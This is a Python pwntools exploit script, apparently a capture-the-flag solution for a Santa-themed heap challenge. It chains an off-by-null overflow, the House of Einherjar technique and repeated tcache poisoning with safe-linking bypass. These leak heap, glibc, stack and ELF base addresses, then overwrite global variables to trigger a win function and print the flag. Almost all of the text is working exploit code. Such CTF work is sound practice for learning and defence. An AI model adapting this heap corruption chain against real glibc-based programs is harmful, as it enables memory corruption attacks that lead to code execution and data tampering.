from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('remote.infoseciitr.in', 8000)

# malloc a chunk of size (0x4f-0x1000) at index (0-0xf, gas to be unused)
def prepare_gift(index, size):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Gift Slot: ", str(index).encode())
    p.sendlineafter(b"Gift Size: ", str(size).encode())

# edit a chunk at index with malloced size of data at most (null terminator included, off-by-null error allowed)
def rewrite_card(index, data):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"Gift Slot: ", str(index).encode())
    p.sendafter(b"Card Message:", data)

# print out a chunk's malloced size of data at index 
def check_gift(index):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Gift Slot: ", str(index).encode())
    p.recvuntil(b"Gift Contents: ")
    return p.recvline().strip()

# free a chunk at index (set its pointer to NULL)
def deliver_gift(index):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"Gift Slot: ", str(index).encode())

# win function (print out flag only if global variable at offset 0x4060 is not 0 and global variable at offset 0x4080 is checked correctly)
def master_key(code):
    p.sendlineafter(b"> ", b'5')
    p.sendafter(b"Enter Santa's Secret Code: ", code)

glibc_e = ELF('./libc.so.6')

# Stage 1: get geap base address and leak glibc base address
p.recvuntil(b"Ho...Ho...Ho..")
heap_base_addr = int(p.recvline().strip(), 16)-0x2a0
log.info(f"heap base address: {hex(heap_base_addr)}")
prepare_gift(0, 0x6f8)
 # avoid consolidation
prepare_gift(8, 0x58)
deliver_gift(0)
prepare_gift(0, 0xf8)
glibc_base_addr = u64(check_gift(0)[:8].ljust(8, b'\x00'))-(glibc_e.symbols['main_arena']+1296)
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: house of enherjar to enable tcache poisoning
for i in range(1, 7):
    prepare_gift(i, 0xf8)
prepare_gift(9, 0x58)
prepare_gift(10, 0x58)
prepare_gift(11, 0x58)
prepare_gift(12, 0xf8)
# avoid consolidation
prepare_gift(13, 0x58)
# free 7 chunks of size 0x100 to fill tcache bin of size 0x100
for i in range(0, 7):
    deliver_gift(i)
# prepare fake chunk of size 0x170 at heap_base_addr+0x9d0 for house of einherjar in chunk at heap_base_addr+0x9c0
rewrite_card(8, p64(0)+p64(0x170)+p64(heap_base_addr+0x9c0)*2)
# overwrite prev_size and size of chunk at heap_base_addr+0xb40 with 0x170 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
rewrite_card(11, b'A'*0x50+p64(0x170))
# free chunk at heap_base_addr+0xb40 to trigger house of einherjar, a chunk of size 0x270 (0x170+0x100) starting from fake chunk at heap_base_addr+0x9d0 is freed into unsorted bin
deliver_gift(12)
# malloc chunk of size 0x270 starting from heap_base_addr+0x9d0 to realize writable for freed chunks in tcache bins
prepare_gift(12, 0x268)

# Stage 3: tcache poisoning to leak stack argv address and elf base address
# prepare for tcache poisoning
deliver_gift(10)
deliver_gift(9)
# now tcache bin of size 0x60 looks like heap_base_addr+0xa20 -> heap_base_addr+0xa80
rewrite_card(12, b'A'*0x48+p64(0x61)+p64((glibc_base_addr+glibc_e.symbols['__libc_argv'])^((heap_base_addr+0xa20)>>12)))
# now tcache bin of size 0x60 looks like heap_base_addr+0xa20 -> glibc_base_addr+glibc_e.symbols['__libc_argv']
# perform tcache poisoning
prepare_gift(9, 0x58)
prepare_gift(10, 0x58)
stack_argv_addr = u64(check_gift(10)[:8].ljust(8, b'\x00'))
log.info(f"stack argv address: {hex(stack_argv_addr)}")
# prepare for tcache poisoning
deliver_gift(11)
deliver_gift(9)
# now tcache bin of size 0x60 looks like heap_base_addr+0xa20 -> heap_base_addr+0xae0
rewrite_card(12, b'A'*0x48+p64(0x61)+p64((stack_argv_addr-0x58)^((heap_base_addr+0xa20)>>12)))
# now tcache bin of size 0x60 looks like heap_base_addr+0xa20 -> stack_argv_addr-0x58
# perform tcache poisoning
prepare_gift(9, 0x58)
prepare_gift(11, 0x58)
elf_base_addr = u64(check_gift(11)[0x18:0x20].ljust(8, b'\x00'))-0x1260
log.info(f"elf base address: {hex(elf_base_addr)}")

# Stage 4: tcache poisoning to overwrite global variable at offset 0x4060 and 0x4080 with 1 and 0xdeadbeefdeadbeef respectively
# prepare for tcache poisoning
deliver_gift(13)
deliver_gift(9)
# now tcache bin of size 0x60 looks like heap_base_addr+0xa20 -> heap_base_addr+0xc40
rewrite_card(12, b'A'*0x48+p64(0x61)+p64((elf_base_addr+0x4060)^((heap_base_addr+0xa20)>>12)))
# now tcache bin of size 0x60 looks like heap_base_addr+0xa20 -> elf_base_addr+0x4060
# perform tcache poisoning
prepare_gift(9, 0x58)
prepare_gift(13, 0x58)
rewrite_card(13, p64(1)+b'A'*0x18+p64(0xdeadbeefdeadbeef)*2)
# trigger win function
master_key(p64(0xdeadbeefdeadbeef)*2)

p.interactive()

# flag{h0_h0_h0_t1ny_null_byt3_c0rrupts_s4nt4s_m3m0ry}